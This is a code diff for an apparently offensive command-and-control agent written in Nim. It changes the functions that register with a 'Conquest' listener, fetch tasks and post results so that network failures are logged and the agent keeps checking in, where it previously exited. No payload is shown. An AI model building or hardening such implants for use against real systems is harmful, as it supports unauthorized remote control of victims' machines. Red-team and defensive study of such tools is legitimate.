@@ -25,8 +25,8 @@ proc register*(listener: string): string =
     try:
         # Register agent to the Conquest server
         return waitFor client.postContent(fmt"http://localhost:5555/{listener}/register", $body)
-    except HttpRequestError as err:
-        echo "Registration failed"
+    except CatchableError as err:
+        echo "[-] [REGISTER FAILED]:", err.msg
         quit(0)
     finally:
         client.close()
@@ -40,10 +40,9 @@ proc getTasks*(listener: string, agent: string): seq[Task] =
         let responseBody = waitFor client.getContent(fmt"http://localhost:5555/{listener}/{agent}/tasks")
         return parseJson(responseBody).to(seq[Task])
 
-    except HttpRequestError as err:
-        echo "Not found"
-        quit(0)
-
+    except CatchableError as err:
+        # When the listener is not reachable, don't kill the application, but check in at the next time
+        echo "[-] [TASK-RETRIEVAL FAILED]:", err.msg
     finally:
         client.close()
 
@@ -61,9 +60,9 @@ proc postResults*(listener, agent: string, task: Task): bool =
     try:
         # Register agent to the Conquest server
         discard waitFor client.postContent(fmt"http://localhost:5555/{listener}/{agent}/{task.id}/results", $taskJson)
-    except HttpRequestError as err:
-        echo "Not found"
-        quit(0)
+    except CatchableError as err:
+        # When the listener is not reachable, don't kill the application, but check in at the next time
+        echo "[-] [RESULTS FAILED]:", err.msg
     finally:
         client.close()
 
